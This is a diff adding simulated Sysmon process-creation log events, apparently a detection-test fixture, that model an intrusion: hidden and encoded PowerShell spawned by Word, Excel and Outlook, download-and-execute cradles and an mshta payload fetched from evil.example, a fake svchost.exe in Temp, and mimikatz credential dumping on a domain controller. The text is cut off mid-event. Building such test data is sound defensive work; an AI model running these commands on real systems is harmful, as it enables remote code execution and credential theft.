@@ -2221,4 +2221,1048 @@
     <Data Name="LogonProcessName">User32</Data>
   </EventData>
 </Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:01:00.0000000Z" />
+    <EventRecordID>1</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:01:00.000</Data>
+    <Data Name="ProcessGuid">{df951fa1-1e59-48b9-a42c-d6a605aa8b07}</Data>
+    <Data Name="ProcessId">10001</Data>
+    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\jdoe\Documents\</Data>
+    <Data Name="User">CORP\jdoe</Data>
+    <Data Name="ParentProcessGuid">{9e3cb13c-5bfd-48cc-a970-35daa5abc90f}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:01:08.0000000Z" />
+    <EventRecordID>2</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:01:08.000</Data>
+    <Data Name="ProcessGuid">{44911227-5789-49bc-96eb-540ccfe07dd7}</Data>
+    <Data Name="ProcessId">10002</Data>
+    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="CommandLine">cmd.exe /c powershell -nop -w hidden</Data>
+    <Data Name="CurrentDirectory">C:\Users\jdoe\Documents\</Data>
+    <Data Name="User">CORP\jdoe</Data>
+    <Data Name="ParentProcessGuid">{df951fa1-1e59-48b9-a42c-d6a605aa8b07}</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="ParentCommandLine">"WINWORD.EXE" /n "invoice.docm"</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:03:08.0000000Z" />
+    <EventRecordID>3</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS02</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:03:08.000</Data>
+    <Data Name="ProcessGuid">{de818867-f89c-4fd7-a365-da32721718a7}</Data>
+    <Data Name="ProcessId">10003</Data>
+    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\ksmith\Documents\</Data>
+    <Data Name="User">CORP\ksmith</Data>
+    <Data Name="ParentProcessGuid">{833396c9-537a-4393-a9e6-da976052eaf7}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:03:13.0000000Z" />
+    <EventRecordID>4</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS02</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:03:13.000</Data>
+    <Data Name="ProcessGuid">{1fd6a4b1-8f82-4714-8adc-34f3acbd4171}</Data>
+    <Data Name="ProcessId">10004</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -EncodedCommand SQBFAFgA...</Data>
+    <Data Name="CurrentDirectory">C:\Users\ksmith\Documents\</Data>
+    <Data Name="User">CORP\ksmith</Data>
+    <Data Name="ParentProcessGuid">{de818867-f89c-4fd7-a365-da32721718a7}</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+    <Data Name="ParentCommandLine">"EXCEL.EXE" /e "budget.xlsm"</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:05:13.0000000Z" />
+    <EventRecordID>5</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS03</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:05:13.000</Data>
+    <Data Name="ProcessGuid">{00405e82-ee82-4c00-bee9-2e6412d3c913}</Data>
+    <Data Name="ProcessId">10005</Data>
+    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\mwilson\Documents\</Data>
+    <Data Name="User">CORP\mwilson</Data>
+    <Data Name="ParentProcessGuid">{17e224b2-1b3e-4064-9ef4-5fa0426591da}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:05:19.0000000Z" />
+    <EventRecordID>6</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS03</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:05:19.000</Data>
+    <Data Name="ProcessGuid">{55c98a74-fc67-48ca-ae2c-e62841af7ac7}</Data>
+    <Data Name="ProcessId">10006</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"</Data>
+    <Data Name="CurrentDirectory">C:\Users\mwilson\Documents\</Data>
+    <Data Name="User">CORP\mwilson</Data>
+    <Data Name="ParentProcessGuid">{00405e82-ee82-4c00-bee9-2e6412d3c913}</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
+    <Data Name="ParentCommandLine">"OUTLOOK.EXE" /recycle</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:07:19.0000000Z" />
+    <EventRecordID>7</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS04</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:07:19.000</Data>
+    <Data Name="ProcessGuid">{889e98d4-397f-4197-94e7-ed2a4f647ce7}</Data>
+    <Data Name="ProcessId">10007</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\tlee\</Data>
+    <Data Name="User">CORP\tlee</Data>
+    <Data Name="ParentProcessGuid">{2a5336d1-7d13-4e40-8a21-ba83f4e10773}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:07:22.0000000Z" />
+    <EventRecordID>8</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS04</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:07:22.000</Data>
+    <Data Name="ProcessGuid">{0efe3d79-51ef-414c-9a6d-27222d5c8aed}</Data>
+    <Data Name="ProcessId">10008</Data>
+    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="CommandLine">cmd.exe /c whoami</Data>
+    <Data Name="CurrentDirectory">C:\Users\tlee\</Data>
+    <Data Name="User">CORP\tlee</Data>
+    <Data Name="ParentProcessGuid">{889e98d4-397f-4197-94e7-ed2a4f647ce7}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="ParentCommandLine">powershell.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:09:22.0000000Z" />
+    <EventRecordID>9</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS05</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:09:22.000</Data>
+    <Data Name="ProcessGuid">{81774133-2deb-413c-b592-d7a910132f5e}</Data>
+    <Data Name="ProcessId">10009</Data>
+    <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+    <Data Name="CommandLine">wscript.exe invoice.vbs</Data>
+    <Data Name="CurrentDirectory">C:\Users\pgomez\Downloads\</Data>
+    <Data Name="User">CORP\pgomez</Data>
+    <Data Name="ParentProcessGuid">{66ff9d9f-e6d7-4f1c-aad8-e14912384426}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:09:26.0000000Z" />
+    <EventRecordID>10</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS05</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:09:26.000</Data>
+    <Data Name="ProcessGuid">{b40f12db-6261-44fd-b80e-36634891c3fa}</Data>
+    <Data Name="ProcessId">10010</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/b.ps1')</Data>
+    <Data Name="CurrentDirectory">C:\Users\pgomez\Downloads\</Data>
+    <Data Name="User">CORP\pgomez</Data>
+    <Data Name="ParentProcessGuid">{81774133-2deb-413c-b592-d7a910132f5e}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
+    <Data Name="ParentCommandLine">wscript.exe invoice.vbs</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:11:26.0000000Z" />
+    <EventRecordID>11</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS06</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:11:26.000</Data>
+    <Data Name="ProcessGuid">{46b384bc-0209-4ad2-8cac-5416c87348db}</Data>
+    <Data Name="ProcessId">10011</Data>
+    <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
+    <Data Name="CommandLine">mshta.exe http://evil.example/payload.hta</Data>
+    <Data Name="CurrentDirectory">C:\Users\swhite\Downloads\</Data>
+    <Data Name="User">CORP\swhite</Data>
+    <Data Name="ParentProcessGuid">{d50bf868-30bd-43d0-ac31-f9975d013d93}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:11:30.0000000Z" />
+    <EventRecordID>12</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS06</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:11:30.000</Data>
+    <Data Name="ProcessGuid">{d5538c4d-9aec-4620-bdf6-3b29856dc4bd}</Data>
+    <Data Name="ProcessId">10012</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell -enc SQBFAFgA...</Data>
+    <Data Name="CurrentDirectory">C:\Users\swhite\Downloads\</Data>
+    <Data Name="User">CORP\swhite</Data>
+    <Data Name="ParentProcessGuid">{46b384bc-0209-4ad2-8cac-5416c87348db}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
+    <Data Name="ParentCommandLine">mshta.exe http://evil.example/payload.hta</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:13:30.0000000Z" />
+    <EventRecordID>13</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS07</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:13:30.000</Data>
+    <Data Name="ProcessGuid">{77710793-29ff-457d-85c5-cb8e812610f7}</Data>
+    <Data Name="ProcessId">10013</Data>
+    <Data Name="Image">C:\Windows\Temp\svchost.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Windows\Temp\</Data>
+    <Data Name="User">CORP\bwong</Data>
+    <Data Name="ParentProcessGuid">{2307e4df-abde-4c33-9879-7709675b75d3}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:14:30.0000000Z" />
+    <EventRecordID>14</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:14:30.000</Data>
+    <Data Name="ProcessGuid">{4a7f0ef1-dc03-4c57-a46b-69a2c141db25}</Data>
+    <Data Name="ProcessId">10014</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="CommandLine">svchost.exe -k netsvcs</Data>
+    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{15d7e70c-00a7-41f6-8bcd-4d2e29c9f2d7}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine">services.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:16:30.0000000Z" />
+    <EventRecordID>15</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS08</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:16:30.000</Data>
+    <Data Name="ProcessGuid">{e7c7a082-7488-4af8-ae60-7f558d8ea184}</Data>
+    <Data Name="ProcessId">10015</Data>
+    <Data Name="Image">C:\Users\cchen\AppData\Local\Temp\update_flash.exe</Data>
+    <Data Name="CommandLine">update_flash.exe /silent</Data>
+    <Data Name="CurrentDirectory">C:\Users\cchen\AppData\Local\Temp\</Data>
+    <Data Name="User">CORP\cchen</Data>
+    <Data Name="ParentProcessGuid">{822564ec-1c7a-4592-a5e5-483807718542}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:17:30.0000000Z" />
+    <EventRecordID>16</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS09</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:17:30.000</Data>
+    <Data Name="ProcessGuid">{bf544db1-2a0f-4dd3-913a-761e45418025}</Data>
+    <Data Name="ProcessId">10016</Data>
+    <Data Name="Image">C:\Users\Public\toolkit.exe</Data>
+    <Data Name="CommandLine">toolkit.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\Public\</Data>
+    <Data Name="User">CORP\dking</Data>
+    <Data Name="ParentProcessGuid">{dba9e027-12c6-4508-a1a5-34edaaa3d7b9}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:19:30.0000000Z" />
+    <EventRecordID>17</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:19:30.000</Data>
+    <Data Name="ProcessGuid">{3e7a3fed-f99f-47b1-b41c-5f31e36f4902}</Data>
+    <Data Name="ProcessId">10017</Data>
+    <Data Name="Image">C:\Windows\Temp\mimikatz.exe</Data>
+    <Data Name="CommandLine">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</Data>
+    <Data Name="CurrentDirectory">C:\Windows\Temp\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{541573e4-1ec0-43c9-bf0a-d568d60ce8f7}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:20:30.0000000Z" />
+    <EventRecordID>18</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:20:30.000</Data>
+    <Data Name="ProcessGuid">{ea33e8aa-a692-4ef3-9bec-b9eefa65d661}</Data>
+    <Data Name="ProcessId">10018</Data>
+    <Data Name="Image">C:\Windows\System32\smss.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{cb91c9e5-880e-4707-8041-c9ec266b9f96}</Data>
+    <Data Name="ParentImage">System</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:20:32.0000000Z" />
+    <EventRecordID>19</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:20:32.000</Data>
+    <Data Name="ProcessGuid">{1371efd3-b9c8-4c42-93f8-028c7b0a29ef}</Data>
+    <Data Name="ProcessId">10019</Data>
+    <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{ea33e8aa-a692-4ef3-9bec-b9eefa65d661}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\smss.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:21:32.0000000Z" />
+    <EventRecordID>20</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:21:32.000</Data>
+    <Data Name="ProcessGuid">{e5f026b7-b602-4bfc-a97c-f61742047996}</Data>
+    <Data Name="ProcessId">10020</Data>
+    <Data Name="Image">C:\Windows\System32\wininit.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{ba52961f-eeef-45ca-ae12-d089f7b045c3}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\smss.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:21:34.0000000Z" />
+    <EventRecordID>21</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:21:34.000</Data>
+    <Data Name="ProcessGuid">{e04a002f-2681-4f68-a71f-8a1350bb635a}</Data>
+    <Data Name="ProcessId">10021</Data>
+    <Data Name="Image">C:\Windows\System32\services.exe</Data>
+    <Data Name="CommandLine" />
